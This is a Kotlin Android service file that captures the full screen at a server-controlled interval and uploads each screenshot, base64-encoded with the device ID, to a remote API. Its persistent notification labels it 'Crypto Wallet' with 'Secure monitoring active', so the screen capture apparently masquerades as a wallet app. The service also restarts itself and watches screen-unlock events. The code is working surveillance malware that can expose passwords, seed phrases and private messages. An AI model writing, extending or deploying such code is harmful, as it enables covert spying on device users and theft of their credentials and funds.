package com.monitoringapp

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.nio.ByteBuffer

class ScreenshotService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private lateinit var windowManager: WindowManager
    private lateinit var displayMetrics: DisplayMetrics
    private val handler = Handler(Looper.getMainLooper())
    private var isCapturing = false
    private var screenshotInterval: Long = 10000 // Default 10 seconds
    
    companion object {
        private const val TAG = "ScreenshotService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "ScreenshotServiceChannel"
        const val ACTION_START = "com.monitoringapp.START_SCREENSHOT"
        const val ACTION_STOP = "com.monitoringapp.STOP_SCREENSHOT"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_DEVICE_ID = "device_id"
        const val EXTRA_DEVICE_NAME = "device_name"
        const val EXTRA_API_URL = "api_url"
        
        var isRunning = false
            private set
    }
    
    private var resultCode: Int = 0
    private var resultData: Intent? = null
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var apiUrl: String = ""
    private var unlockReceiver: UnlockReceiver? = null
    
    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        displayMetrics = DisplayMetrics()
        windowManager.defaultDisplay.getMetrics(displayMetrics)
        
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand called with action: ${intent?.action}")
        
        when (intent?.action) {
            ACTION_START -> {
                resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 0)
                resultData = intent.getParcelableExtra(EXTRA_RESULT_DATA)
                deviceId = intent.getStringExtra(EXTRA_DEVICE_ID) ?: ""
                deviceName = intent.getStringExtra(EXTRA_DEVICE_NAME) ?: ""
                apiUrl = intent.getStringExtra(EXTRA_API_URL) ?: ""
                
                Log.d(TAG, "Starting service with deviceId: $deviceId, apiUrl: $apiUrl")
                
                // Save device info for UnlockReceiver
                val prefs = getSharedPreferences("MonitoringPrefs", Context.MODE_PRIVATE)
                prefs.edit().apply {
                    putString("deviceId", deviceId)
                    putString("deviceName", deviceName)
                    putString("apiUrl", apiUrl)
                    apply()
                }
                
                startForeground(NOTIFICATION_ID, createNotification())
                registerScreenReceiver()
                startScreenCapture()
                isRunning = true
                Log.d(TAG, "Service started successfully, isRunning: $isRunning")
            }
            ACTION_STOP -> {
                Log.d(TAG, "Stopping service")
                stopScreenCapture()
                stopSelf()
            }
        }
        return START_STICKY
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screenshot Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitoring active in background"
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        val stopIntent = Intent(this, ScreenshotService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPendingIntent = PendingIntent.getService(
            this, 0, stopIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Crypto Wallet")
            .setContentText("Secure monitoring active")
            .setSmallIcon(android.R.drawable.ic_secure)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .addAction(android.R.drawable.ic_delete, "Stop", stopPendingIntent)
            .build()
    }
    
    private fun startScreenCapture() {
        try {
            Log.d(TAG, "Starting screen capture...")
            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, resultData!!)
            
            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null")
                stopSelf()
                return
            }
            
            Log.d(TAG, "MediaProjection created successfully")
            
            // Register callback for MediaProjection (required on Android 14+)
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.d(TAG, "MediaProjection stopped")
                    stopScreenCapture()
                }
            }, handler)
            
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            val density = displayMetrics.densityDpi
            
            Log.d(TAG, "Screen dimensions: ${width}x${height}, density: $density")
            
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )
            
            Log.d(TAG, "VirtualDisplay created, starting periodic capture")
            
            // Fetch interval from server and start periodic screenshot capture
            fetchIntervalAndStartCapture()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error starting screen capture", e)
            stopSelf()
        }
    }
    
    private fun fetchIntervalAndStartCapture() {
        Thread {
            try {
                Log.d(TAG, "Fetching screenshot interval from server...")
                val client = OkHttpClient()
                val request = Request.Builder()
                    .url("$apiUrl/api/devices/$deviceId/interval")
                    .get()
                    .build()
                
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string()
                        val json = JSONObject(responseBody ?: "{}")
                        val intervalFromServer = json.optLong("screenshotInterval", 10000)
                        screenshotInterval = intervalFromServer
                        Log.d(TAG, "Screenshot interval set to: $screenshotInterval ms")
                    } else {
                        Log.w(TAG, "Failed to fetch interval, using default: $screenshotInterval ms")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error fetching interval, using default: $screenshotInterval ms", e)
            } finally {
                // Start capture with the interval (either fetched or default)
                scheduleNextCapture()
                // Also schedule periodic interval refresh (every 30 seconds)
                scheduleIntervalRefresh()
            }
        }.start()
    }
    
    private fun scheduleIntervalRefresh() {
        handler.postDelayed({
            if (isRunning) {
                refreshInterval()
                scheduleIntervalRefresh()
            }
        }, 30000) // Refresh interval every 30 seconds
    }
    
    private fun refreshInterval() {
        Thread {
            try {
                val client = OkHttpClient()
                val request = Request.Builder()
                    .url("$apiUrl/api/devices/$deviceId/interval")
                    .get()
                    .build()
                
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string()
                        val json = JSONObject(responseBody ?: "{}")
                        val newInterval = json.optLong("screenshotInterval", screenshotInterval)
                        if (newInterval != screenshotInterval) {
                            Log.d(TAG, "Screenshot interval updated from $screenshotInterval to $newInterval ms")
                            screenshotInterval = newInterval
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error refreshing interval", e)
            }
        }.start()
    }
    
    private fun scheduleNextCapture() {
        handler.postDelayed({
            if (isRunning && !isCapturing) {
                Log.d(TAG, "Triggering screenshot capture (interval: $screenshotInterval ms)")
                captureScreenshot()
            }
            scheduleNextCapture()
        }, screenshotInterval)
    }
    
    private fun captureScreenshot() {
        if (isCapturing) {
            Log.d(TAG, "Already capturing, skipping...")
            return
        }
        
        Log.d(TAG, "Starting screenshot capture")
        isCapturing = true
        
        try {
            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer: ByteBuffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * displayMetrics.widthPixels
                
                val bitmap = Bitmap.createBitmap(
                    displayMetrics.widthPixels + rowPadding / pixelStride,
                    displayMetrics.heightPixels,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()
                
                // Crop to actual screen size if needed
                val croppedBitmap = if (rowPadding > 0) {
                    Bitmap.createBitmap(bitmap, 0, 0, displayMetrics.widthPixels, displayMetrics.heightPixels)
                } else {
                    bitmap
                }
                
                // Upload screenshot
                uploadScreenshot(croppedBitmap)
                
            } else {
                Log.w(TAG, "No image available")
                isCapturing = false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing screenshot", e)
            isCapturing = false
        }
    }
    
    private fun uploadScreenshot(bitmap: Bitmap) {
        Thread {
            try {
                Log.d(TAG, "Converting bitmap to base64...")
                // Convert bitmap to base64
                val outputStream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
                val imageBytes = outputStream.toByteArray()
                val base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
                
                Log.d(TAG, "Base64 size: ${base64Image.length}, uploading to: $apiUrl")
                
                // Prepare JSON payload
                val json = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("imageBase64", base64Image)
                    put("metadata", JSONObject().apply {
                        put("timestamp", System.currentTimeMillis())
                        put("deviceName", deviceName)
                    })
                }
                
                // Upload to backend
                val client = OkHttpClient()
                val mediaType = "application/json; charset=utf-8".toMediaType()
                val body = json.toString().toRequestBody(mediaType)
                
                val request = Request.Builder()
                    .url("$apiUrl/api/screenshots/upload-monitoring")
                    .post(body)
                    .build()
                
                Log.d(TAG, "Sending request to server...")
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Screenshot uploaded successfully: ${response.body?.string()}")
                    } else {
                        Log.e(TAG, "Upload failed: ${response.code} - ${response.message}")
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading screenshot", e)
            } finally {
                isCapturing = false
            }
        }.start()
    }
    
    private fun registerScreenReceiver() {
        try {
            unlockReceiver = UnlockReceiver()
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(unlockReceiver, filter)
            Log.d(TAG, "Screen receiver registered")
        } catch (e: Exception) {
            Log.e(TAG, "Error registering screen receiver", e)
        }
    }
    
    private fun unregisterScreenReceiver() {
        try {
            unlockReceiver?.let {
                unregisterReceiver(it)
                unlockReceiver = null
                Log.d(TAG, "Screen receiver unregistered")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering screen receiver", e)
        }
    }
    
    private fun stopScreenCapture() {
        handler.removeCallbacksAndMessages(null)
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        mediaProjection?.stop()
        mediaProjection = null
        isRunning = false
    }
    
    override fun onDestroy() {
        super.onDestroy()
        unregisterScreenReceiver()
        stopScreenCapture()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
}
